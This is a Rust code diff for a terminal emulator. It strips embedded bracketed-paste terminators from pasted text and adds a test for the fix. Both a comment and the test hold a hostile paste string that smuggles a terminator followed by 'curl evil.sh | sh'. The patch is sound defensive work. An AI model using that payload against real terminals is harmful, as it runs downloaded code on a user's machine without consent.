@@ -229,7 +229,13 @@ pub fn encode_paste(text: &str, screen: &vt100::Screen) -> Vec<u8> {
     }
     let mut out = Vec::with_capacity(text.len() + 12);
     out.extend_from_slice(b"\x1b[200~");
-    out.extend_from_slice(text.as_bytes());
+    // Strip any terminator the payload carries. Left in, it ends paste mode
+    // early and everything after it arrives as *typed* input — so clipboard
+    // text like "ls\x1b[201~\ncurl evil.sh | sh\n" runs on the box the moment
+    // it is pasted, with no Enter from the user. That is precisely the
+    // distinction bracketed paste exists to enforce, and xterm, alacritty and
+    // kitty all filter it for the same reason.
+    out.extend_from_slice(text.replace("\x1b[201~", "").as_bytes());
     out.extend_from_slice(b"\x1b[201~");
     out
 }
@@ -428,6 +434,23 @@ mod tests {
             encode_paste("cd /tmp", bracketed.screen()),
             b"\x1b[200~cd /tmp\x1b[201~".to_vec()
         );
+    }
+
+    #[test]
+    fn a_paste_cannot_smuggle_its_own_terminator() {
+        // Without stripping, everything after the embedded terminator reaches
+        // the remote shell as typed input and runs without an Enter press.
+        let bracketed = screen_with(b"\x1b[?2004h");
+        let hostile = "ls\x1b[201~\ncurl evil.sh | sh\n";
+        let wire = encode_paste(hostile, bracketed.screen());
+
+        let terminators = wire
+            .windows(6)
+            .filter(|window| *window == b"\x1b[201~")
+            .count();
+        assert_eq!(terminators, 1, "exactly one terminator, and it is ours");
+        assert!(wire.ends_with(b"\x1b[201~"));
+        assert!(wire.starts_with(b"\x1b[200~"));
     }
 
     #[test]
